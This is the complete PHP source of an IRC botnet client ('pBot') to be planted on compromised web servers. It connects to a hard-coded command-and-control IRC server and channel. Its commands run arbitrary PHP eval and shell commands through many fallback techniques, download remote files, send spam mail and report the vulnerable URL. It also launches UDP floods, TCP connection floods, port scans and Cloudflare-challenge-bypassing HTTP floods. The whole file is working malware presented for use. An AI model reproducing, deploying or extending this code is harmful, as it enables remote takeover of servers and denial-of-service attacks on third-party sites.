<?php
    /*
     You will need to define your IRC server information yourself.
     I will not help you do this, if you don't know how you shouldn't
     be using this script.
     */
    set_time_limit(0);
    error_reporting(0);
    ignore_user_abort(true);
    
    $dir = getcwd();
    $uname= @php_uname();
    
    function whereistmP()
    {
        $uploadtmp=ini_get('upload_tmp_dir');
        $uf=getenv('USERPROFILE');
        $af=getenv('ALLUSERSPROFILE');
        $se=ini_get('session.save_path');
        $envtmp=(getenv('TMP'))?getenv('TMP'):getenv('TEMP');
        if(is_dir('/tmp') && is_writable('/tmp'))return '/tmp';
        if(is_dir('/usr/tmp') && is_writable('/usr/tmp'))return '/usr/tmp';
        if(is_dir('/var/tmp') && is_writable('/var/tmp'))return '/var/tmp';
        if(is_dir($uf) && is_writable($uf))return $uf;
        if(is_dir($af) && is_writable($af))return $af;
        if(is_dir($se) && is_writable($se))return $se;
        if(is_dir($uploadtmp) && is_writable($uploadtmp))return $uploadtmp;
        if(is_dir($envtmp) && is_writable($envtmp))return $envtmp;
        return '.';
    }
    function srvshelL($command)
    {
        $name=whereistmP()."\\".uniqid('NJ');
        $n=uniqid('NJ');
        $cmd=(empty($_SERVER['ComSpec']))?'d:\\windows\\system32\\cmd.exe':$_SERVER['ComSpec'];
        win32_create_service(array('service'=>$n,'display'=>$n,'path'=>$cmd,'params'=>"/c $command >\"$name\""));
        win32_start_service($n);
        win32_stop_service($n);
        win32_delete_service($n);
        while(!file_exists($name))sleep(1);
        $exec=file_get_contents($name);
        unlink($name);
        return $exec;
    }
    function ffishelL($command)
    {
        $name=whereistmP()."\\".uniqid('NJ');
        $api=new ffi("[lib='kernel32.dll'] int WinExec(char *APP,int SW);");
        $res=$api->WinExec("cmd.exe /c $command >\"$name\"",0);
        while(!file_exists($name))sleep(1);
        $exec=file_get_contents($name);
        unlink($name);
        return $exec;
    }
    function comshelL($command,$ws)
    {
        $exec=$ws->exec("cmd.exe /c $command");
        $so=$exec->StdOut();
        return $so->ReadAll();
    }
    function perlshelL($command)
    {
        $perl=new perl();
        ob_start();
        $perl->eval("system(\"$command\")");
        $exec=ob_get_contents();
        ob_end_clean();
        return $exec;
    }
    function Exe($command)
    {
        $exec=$output='';
        $dep[]=array('pipe','r');$dep[]=array('pipe','w');
        if(function_exists('passthru')){ob_start();@passthru($command);$exec=ob_get_contents();ob_clean();ob_end_clean();}
        elseif(function_exists('system')){$tmp=ob_get_contents();ob_clean();@system($command);$output=ob_get_contents();ob_clean();$exec=$tmp;}
        elseif(function_exists('exec')){@exec($command,$output);$output=joinn("\n",$output);$exec=$output;}
        elseif(function_exists('shell_exec'))$exec=@shell_exec($command);
        elseif(function_exists('popen')){$output=@popen($command,'r');while(!feof($output)){$exec=fgets($output);}pclose($output);}
        elseif(function_exists('proc_open')){$res=@proc_open($command,$dep,$pipes);while(!feof($pipes[1])){$line=fgets($pipes[1]);$output.=$line;}$exec=$output;proc_close($res);}
        elseif(function_exists('win_shell_execute') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')$exec=winshelL($command);
        elseif(function_exists('win32_create_service') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')$exec=srvshelL($command);
        elseif(extension_loaded('ffi') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')$exec=ffishelL($command);
        elseif(extension_loaded('perl'))$exec=perlshelL($command);
        return $exec;
    }
    function bypassyourdog($domain, $useragent, $proxy) {
        $cURL = curl_init();
        curl_setopt($cURL, CURLOPT_URL, $domain);
        curl_setopt($cURL, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($cURL, CURLOPT_HEADER, 1);
        curl_setopt($cURL, CURLOPT_USERAGENT, $useragent);
        curl_setopt($cURL, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($cURL, CURLOPT_PROXY, $proxy);
        curl_setopt($cURL, CURLOPT_COOKIEFILE, "cookie.txt");
        $string = curl_exec($cURL);
        curl_close($cURL);
        $domain = get_between($string, '</span> ', '.</h1>');
        $jschl_vc = get_between($string, '"jschl_vc" value="', '"/>');
        $pass = get_between($string, '"pass" value="', '"/>');
        $settimeout = get_between($string, 'setTimeout(function(){', 'f.submit()');
        $mathvariables = get_between($settimeout, 'var t,r,a,f, ', ';');
        $mathvariable = explode('=', $mathvariables);
        $mathvariable1 = get_between($mathvariables, '{"', '":');
        $mathvariable2 = $mathvariable[0].".".$mathvariable1;
        $math1 = get_between($mathvariables, '":', '}');
        $math2 = $mathvariable[0].get_between($settimeout, ";".$mathvariable[0], ';a.value');
        $fuck = 0;
        $math2s = explode(';', $math2);
        $mathtotal = 0;
        $answers = array();
        $totalformath1 = 0;
        //echo "Domain: $domain\nJSCHL_VC: $jschl_vc\nPASS: $pass\nSet Timeout: $settimeout\n";
        if($pass == NULL) {
            //file_put_contents('log.txt', $string, FILE_APPEND);
            return 'Bypass failed';
        }
        if(get_between($math1, '((', '))') != NULL) {
            $dog311 = get_between($math1, '((', '))');
            $math1ss = explode(')', $dog311);
            $math1sss = explode('+', $math1ss[0]);
            $math1ssss = explode('(', $dog311);
            $math1sssss = explode('+', $math1ssss[1]);
            $ifuckdog = 0;
            $ufuckdog = 0;
            foreach($math1sss as $imoutofvars2) {
                if ($imoutofvars2 == "!" || $imoutofvars2 == "!![]" || $imoutofvars2 == "![]") {
                    $ifuckdog++;
                }
            }
            foreach($math1sssss as $imoutofvars3) {
                if ($imoutofvars3 == "!" || $imoutofvars3 == "!![]" || $imoutofvars3 == "![]") {
                    $ufuckdog++;
                }
            }
            $totalformath1 = $ifuckdog.$ufuckdog;
            array_push($answers, $totalformath1." +");
        } else {
            $math1ss = explode('+', $math1);
            foreach($math1ss as $fuckmydog){
                if ($fuckmydog == "!" || $fuckmydog == "!![]" || $fuckmydog == "![]") {
                    $totalformath1++;
                }
            }
            array_push($answers, $totalformath1." +");
        }
        foreach($math2s as $dog123){
            $typeofmath = substr($dog123, strlen($mathvariable2), 1);
            if(get_between($dog123, '((', '))') != NULL) {
                $dog321 = get_between($dog123, '((', '))');
                $poop = 0;
                $shit = 0;
                $mathss = explode(')', $dog321);
                $mathsss = explode('+', $mathss[0]);
                $mathssss = explode('(', $dog321);
                $mathsssss = explode('+', $mathssss[1]);
                foreach($mathsss as $imoutofvars) {
                    if ($imoutofvars == "!" || $imoutofvars == "!![]" || $imoutofvars == "![]") {
                        $poop++;
                    }
                }
                foreach($mathsssss as $imoutofvars1) {
                    if ($imoutofvars1 == "!" || $imoutofvars1 == "!![]" || $imoutofvars1 == "![]") {
                        $shit++;
                    }
                }
                $fuck = $poop.$shit;
                array_push($answers, $fuck." ".$typeofmath);
                $fuck = 0;
            } else {
                $fuckingdogs = explode('=', $dog123);
                $fuckingcats = explode('+', $fuckingdogs[1]);
                foreach($fuckingcats as $idinglecats) {
                    if ($idinglecats == "!" || $idinglecats == "!![]" || $idinglecats == "![]") {
                        $fuck++;
                    }
                }
                array_push($answers, $fuck." ".$typeofmath);
                $fuck = 0;
            }
        }
        foreach($answers as $answer) {
            $ilikedogs = explode(' ', $answer);
            switch($ilikedogs[1]) {
                case "+":
                    $mathtotal = $mathtotal + $ilikedogs[0];
                    break;
                case "-":
                    $mathtotal = $mathtotal - $ilikedogs[0];
                    break;
                case "*":
                    $mathtotal = $mathtotal * $ilikedogs[0];
                    break;
            }
        }
        $jschl_answer = strlen($domain) + $mathtotal;
        $domain1 = $domain."/cdn-cgi/l/chk_jschl?jschl_vc=$jschl_vc&pass=$pass&jschl_answer=$jschl_answer";
        usleep(3000000);
        $cURL1 = curl_init();
        curl_setopt($cURL1, CURLOPT_URL, $domain1);
        curl_setopt($cURL1, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($cURL1, CURLOPT_HEADER, 1);
        curl_setopt($cURL1, CURLOPT_USERAGENT, $useragent);
        curl_setopt($cURL1, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($cURL1, CURLOPT_PROXY, $proxy);
        curl_setopt($cURL1, CURLOPT_COOKIEFILE, "cookie.txt");
        $test = curl_exec($cURL1);
        $cfuid = get_between($test, '__cfduid=', '; expires');
        $cf_clearance = get_between($test, 'cf_clearance=', '; expires');
        //echo '__cfduid='.$cfuid.'; cf_clearance='.$cf_clearance."\n";
        return '__cfduid='.$cfuid.'; cf_clearance='.$cf_clearance;
    }
    class pBot
    {
        
        var $config = array("server"=>"n0m3rcy.bounceme.net", "port"=>"6667","key"=>"","prefix"=>"", "maxrand"=>"6", "chan"=>"#n0m3rcy","trigger"=>"-","hostauth"=>"r00tb0x.nsa.gov");
        var $users = array();
        function start()
        {
            while(true)
            {
                if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) $this->start();
                $ident = $this->config['prefix'];
                $alph = range("0","9");
                for($i=0;$i<$this->config['maxrand'];$i++) $ident .= $alph[rand(0,9)];
                $this->send("USER ".$ident." 127.0.0.1 localhost :".php_uname()."");
                $this->set_nick();
                $this->main();
            }
        }
        function main()
        {
            while(!feof($this->conn))
            {
                if(function_exists('stream_select'))
                {
                    $read = array($this->conn);
                    $write = NULL;
                    $except = NULL;
                    $changed = stream_select($read, $write, $except, 30);
                    if($changed == 0)
                    {
                        fwrite($this->conn, "PING :lelcomeatme\r\n");
                        $read = array($this->conn);
                        $write = NULL;
                        $except = NULL;
                        $changed = stream_select($read, $write, $except, 30);
                        if($changed == 0) break;
                    }
                }
                $this->buf = trim(fgets($this->conn,512));
                $cmd = explode(" ",$this->buf);
                if(substr($this->buf,0,6)=="PING :") { $this->send("PONG :".substr($this->buf,6)); continue; }
                if(isset($cmd[1]) && $cmd[1] =="001") { $this->joinn($this->config['chan'],$this->config['key']); continue; }
                if(isset($cmd[1]) && $cmd[1]=="433") { $this->set_nick(); continue; }
                if($this->buf != $old_buf)
                {
                    $mcmd = array();
                    $msg = substr(strstr($this->buf," :"),2);
                    $msgcmd = explode(" ",$msg);
                    $nick = explode("!",$cmd[0]);
                    $vhost = explode("@",$nick[1]);
                    $vhost = $vhost[1];
                    $nick = substr($nick[0],1);
                    $host = $cmd[0];
                    if($msgcmd[0]==$this->nick) for($i=0;$i<count($msgcmd);$i++) $mcmd[$i] = $msgcmd[$i+1];
                    else for($i=0;$i<count($msgcmd);$i++) $mcmd[$i] = $msgcmd[$i];
                    
                    if(count($cmd)>2)
                    {
                        switch($cmd[1])
                        {
                            case "PRIVMSG":
                                if(true)
                                {
                                    if(substr($mcmd[0],0,1)==".")
                                    {
                                        switch(substr($mcmd[0],1))
                                        {
                                            case "mail": //mail to from subject message
                                                if(count($mcmd)>4)
                                                {
                                                    $header = "From: <".$mcmd[2].">";
                                                    if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header))
                                                    {
                                                        $this->privmsg($this->config['chan'],"[\2mail\2]: Unable to send.");
                                                    }
                                                    else
                                                    {
                                                        $this->privmsg($this->config['chan'],"[\2mail\2]: Email sent \2".$mcmd[1]."\2");
                                                    }
                                                }
                                                break;
                                            case "safe":
                                                if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
                                                {
                                                    $safemode = "on";
                                                }
                                                else {
                                                    $safemode = "off";
                                                }
                                                $this->privmsg($this->config['chan'],"[\2safe mode\2]: ".$safemode."");
                                                break;
                                            case "inbox": //teste inbox
                                                if(isset($mcmd[1]))
                                                {
                                                    $token = md5(uniqid(rand(), true));
                                                    $header = "From: <inbox".$token."@xdevil.org>";
                                                    $a = php_uname();
                                                    $b = getenv("SERVER_SOFTWARE");
                                                    $c = gethostbyname($_SERVER["HTTP_HOST"]);
                                                    if(!mail($mcmd[1],"InBox Test","#crew@corp. since 2003\n\nip: $c \nsoftware: $b \nsystem: $a \nvuln: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\n\ngreetz: wicked\nby: dvl <admin@xdevil.org>",$header))
                                                    {
                                                        $this->privmsg($this->config['chan'],"[\2inbox\2]: Unable to send");
                                                    }
                                                    else
                                                    {
                                                        $this->privmsg($this->config['chan'],"[\2inbox\2]: Message sent to \2".$mcmd[1]."\2");
                                                    }
                                                }
                                                break;
                                            case "conback":
                                                if(count($mcmd)>2)
                                                {
                                                    $this->conback($mcmd[1],$mcmd[2]);
                                                }
                                                break;
                                            case "dns":
                                                if(isset($mcmd[1]))
                                                {
                                                    $ip = explode(".",$mcmd[1]);
                                                    if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3]))
                                                    {
                                                        $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1]));
                                                    }
                                                    else
                                                    {
                                                        $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1]));
                                                    }
                                                }
                                                break;
                                            case "vunl":
                                                if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
                                                else { $safemode = "off"; }
                                                $uname = php_uname();
                                                $this->privmsg($this->config['chan'],"[\2info\2]: $uname (safe: $safemode)");
                                                $this->privmsg($this->config['chan'],"[\2vuln\2]: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."");
                                                break;
                                            case "uname":
                                                if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
                                                else { $safemode = "off"; }
                                                $uname = php_uname();
                                                $this->privmsg($this->config['chan'],"[\2info\2]: ".$uname." (safe: ".$safemode.")");
                                                break;
                                            case "rndnick":
                                                $this->set_nick();
                                                break;
                                            case "raw":
                                                $this->send(strstr($msg,$mcmd[1]));
                                                break;
                                            case "eval":
                                                
                                                ob_start();
                                                eval(strstr($msg,$mcmd[1]));
                                                $exec=ob_get_contents();
                                                ob_end_clean();
                                                $ret = explode("\n",$exec);
                                                for($i=0;$i<count($ret);$i++) if($ret[$i]!=NULL) $this->privmsg($this->config['chan'],"".trim($ret[$i]));
                                                break;
                                            case "sexec":
                                                $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                                                $exec = shell_exec($command);
                                                $ret = explode("\n",$exec);
                                                for($i=0;$i<count($ret);$i++)
                                                    if($ret[$i]!=NULL)
                                                        $this->privmsg($this->config['chan'],"".trim($ret[$i]));
                                                break;
                                            case "exec":
                                                $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                                                $exec = exec($command);
                                                $ret = explode("\n",$exec);
                                                for($i=0;$i<count($ret);$i++)
                                                    if($ret[$i]!=NULL)
                                                        $this->privmsg($this->config['chan'],"".trim($ret[$i]));
                                                break;
                                            case "passthru":
                                                $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                                                $exec = passthru($command);
                                                $ret = explode("\n",$exec);
                                                for($i=0;$i<count($ret);$i++)
                                                    if($ret[$i]!=NULL)
                                                        $this->privmsg($this->config['chan'],"".trim($ret[$i]));
                                                break;
                                            case "popen":
                                                if(isset($mcmd[1]))
                                                {
                                                    $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                                                    $this->privmsg($this->config['chan'],"[\2popen\2]: $command");
                                                    $pipe = popen($command,"r");
                                                    while(!feof($pipe))
                                                    {
                                                        $pbuf = trim(fgets($pipe,512));
                                                        if($pbuf != NULL)
                                                            $this->privmsg($this->config['chan'],"$pbuf");
                                                    }
                                                    pclose($pipe);
                                                }
                                                
                                            case "system":
                                                $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                                                $exec = system($command);
                                                $ret = explode("\n",$exec);
                                                for($i=0;$i<count($ret);$i++)
                                                    if($ret[$i]!=NULL)
                                                        $this->privmsg($this->config['chan'],"".trim($ret[$i]));
                                                break;
                                            case "pscan":
                                                $hostip = $mcmd[1];
                                                
                                                $this->privmsg($this->config['chan'], "scanning port. Target: $hostip");
                                                $tcpScanner = new TcpPortScanner($hostip);
                                                $openPorts = $tcpScanner->scan();
                                                if (count($openPorts) == 0) {
                                                    $this->privmsg($this->config['chan'], "no open ports found on $hostip");
                                                } else {
                                                    echo "open tcp ports:<br/>";
                                                    foreach ($openPorts as $portNumber => $service) {
                                                        $this->privmsg($this->config['chan'], "$hostip: $portNumber ($service)");
                                                    }
                                                }
                                                break;
                                            case "cmd":
                                                $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                                                $exec = Exe($command);
                                                $ret = explode("\n",$exec);
                                                for($i=0;$i<count($ret);$i++) if($ret[$i]!=NULL) $this->privmsg($this->config['chan'],"".trim($ret[$i]));
                                                break;
                                            case "ud.server":
                                                if(count($mcmd)>2)
                                                {
                                                    $this->config['server'] = $mcmd[1];
                                                    $this->config['port'] = $mcmd[2];
                                                    if(isset($mcmcd[3]))
                                                    {
                                                        $this->config['pass'] = $mcmd[3];
                                                        $this->privmsg($this->config['chan'],"[\2update\2]: info updated ".$mcmd[1].":".$mcmd[2]." pass: ".$mcmd[3]);
                                                    }
                                                    else
                                                    {
                                                        $this->privmsg($this->config['chan'],"[\2update\2]: switched server to ".$mcmd[1].":".$mcmd[2]);
                                                    }
                                                    fclose($this->conn);
                                                }
                                                break;
                                            case "download":
                                                if(count($mcmd) > 2)
                                                {
                                                    if(!$fp = fopen($mcmd[2],"w"))
                                                    {
                                                        $this->privmsg($this->config['chan'],"[\2download\2]: could not open output file.");
                                                    }
                                                    else
                                                    {
                                                        if(!$get = file($mcmd[1]))
                                                        {
                                                            $this->privmsg($this->config['chan'],"[\2download\2]: could not download \2".$mcmd[1]."\2");
                                                        }
                                                        else
                                                        {
                                                            for($i=0;$i<=count($get);$i++)
                                                            {
                                                                fwrite($fp,$get[$i]);
                                                            }
                                                            $this->privmsg($this->config['chan'],"[\2download\2]: file \2".$mcmd[1]."\2 downloaded to \2".$mcmd[2]."\2");
                                                        }
                                                        fclose($fp);
                                                    }
                                                }
                                                else { $this->privmsg($this->config['chan'],"[\2download\2]: use .download http://your.host/file /tmp/file"); }
                                                break;
                                            case "die":
                                                $this->send("QUIT :die command from $nick");
                                                fclose($this->conn);
                                                exit;
                                            case "udpflood":
                                                if(count($mcmd)>4) { $this->udpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4]); }
                                                break;
                                            case "tcpconn":
                                                if(count($mcmd)>3) { $this->tcpconn($mcmd[1],$mcmd[2],$mcmd[3]); }
                                                break;
                                            case "cf":
                                                if(count($mcmd)>2) { $this->cfflood($mcmd[1],$mcmd[2]); }
                                                break;
                                        }
                                    }
                                }
                                break;
                        }
                    }
                }
            }
        }
        function send($msg) { fwrite($this->conn,$msg."\r\n"); }
        function joinn($chan,$key=NULL) { $this->send("JOIN ".$chan." ".$key); }
        function privmsg($to,$msg) { $this->send("PRIVMSG ".$to." :".$msg); }
        function notice($to,$msg) { $this->send("NOTICE ".$to." :".$msg); }
        function set_nick()
        {
            $this->nick = "";
            if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $this->nick .= "[WIN]";
            else $this->nick .= "[UNIX]";
            $this->nick .= $this->config['prefix'];
            for($i=0;$i<$this->config['maxrand'];$i++) $this->nick .= mt_rand(0,9);
            $this->send("NICK ".$this->nick);
        }
        function udpflood($host,$port,$time,$packetsize) {
            $this->privmsg($this->config['chan'],"[\2UdpFlood Started!\2]");
            $packet = "";
            for($i=0;$i<$packetsize;$i++) { $packet .= chr(rand(1,256)); }
            $end = time() + $time;
            $multitarget = false;
            if(strpos($host, ",") !== FALSE)
            {
                $multitarget = true;
                $host = explode(",", $host);
            }
            $i = 0;
            if($multitarget)
            {
                $fp = array();
                foreach($host as $hostt) $fp[] = fsockopen("udp://".$hostt,$port,$e,$s,5);
                
                $count = count($host);
                while(true)
                {
                    fwrite($fp[$i % $count],$packet);
                    fflush($fp[$i % $count]);
                    if($i % 100 == 0)
                    {
                        if($end < time()) break;
                    }
                    $i++;
                }
                
                foreach($fp as $fpp) fclose($fpp);
            } else {
                $fp = fsockopen("udp://".$host,$port,$e,$s,5);
                while(true)
                {
                    fwrite($fp,$packet);
                    fflush($fp);
                    if($i % 100 == 0)
                    {
                        if($end < time()) break;
                    }
                    $i++;
                }
                fclose($fp);
            }
            $env = $i * $packetsize;
            $env = $env / 1048576;
            $vel = $env / $time;
            $vel = round($vel);
            $env = round($env);
            $this->privmsg($this->config['chan'],"[\2UdpFlood Finished!\2]: ".$env." MB sent / Average: ".$vel." MB/s ");
        }
        function cfflood($host, $time) {
            $useragents = array(
                                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
                                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
                                "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11","Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
                                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
                                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
                                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11","Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
                                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11","Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1","Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
                                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
                                "Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
                                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
                                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11","Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
                                );
            $ua = $useragents[array_rand($useragents)];
            $end = time() + $time;
            if(!function_exists('curl_version')){
                $this->privmsg($this->config['chan'],"[\2cURL not detected!\2]");
                return false;
            }
            $check = curl_init();
            curl_setopt($check, CURLOPT_URL, $host);
            curl_setopt($check, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($check, CURLOPT_USERAGENT, $ua);
            curl_setopt($check, CURLOPT_FOLLOWLOCATION, true);
            $check1 = curl_exec($check);
            curl_close($check);
            if(strstr($check1, "DDoS protection by CloudFlare")){
                $this->privmsg($this->config['chan'],"[\2UAM Not Detected!\2]");
                return false;
            }
            $bypasscookie = bypassyourdog($host, $ua, NULL);
            if(strlen($bypasscookie) > 70) {
                $this->privmsg($this->config['chan'],"[\2Starting CF Bypass flood!\2]");
                while($end > time()) {
                    $flood = curl_init();
                    curl_setopt($flood, CURLOPT_URL, $host);
                    curl_setopt($flood, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($flood, CURLOPT_USERAGENT, $ua);
                    curl_setopt($flood, CURLOPT_FOLLOWLOCATION, true);
                    curl_setopt($flood, CURLOPT_COOKIE, $bypasscookie);
                    $flood123 = curl_exec($flood);
                    curl_close($flood);
                }
                $this->privmsg($this->config['chan'],"[\2CFBypass flood over.!\2]");
            } else {
                $this->privmsg($this->config['chan'],"[\2Bypass failed!\2]");
                return false;
            }
        }
        function tcpconn($host,$port,$time)
        {
            $this->privmsg($this->config['chan'],"[\2TcpConn Started!\2]");
            $end = time() + $time;
            $i = 0;
            while($end > time())
            {
                $fp = fsockopen($host, $port, $dummy, $dummy, 1);
                fclose($fp);
                $i++;
            }
            $this->privmsg($this->config['chan'],"[\2TcpFlood Finished!\2]: sent ".$i." connections to $host:$port.");
        }
    }
    
    class TcpPortScanner {
        var $startPort;
        var $endPort;
        var $hostIP;
        var $timeout;
        var $openPorts = array();
        public function __construct ($hostIP, $startPort=1, $endPort=10000, $timeout=1) {
            $this->startPort = $startPort;
            $this->endPort   = $endPort;
            $this->hostIP    = $hostIP;
            $this->timeout   = $timeout;
        }
        public function scan () {
            set_time_limit(0);
            for ($index = $this->startPort; $index <= $this->endPort; $index++) {
                flush();
                $handle = fsockopen(
                                    $this->hostIP,
                                    $index,
                                    $errno,
                                    $errstr,
                                    $this->timeout
                                    );
                if ($handle) {
                    $service = getservbyport($index, "tcp");
                    $this->openPorts[$index] = "$service";
                    fclose($handle);
                }
            }
            return $this->openPorts;
        }
    }

    $bot = new pBot;
    $bot->start();
    ?>
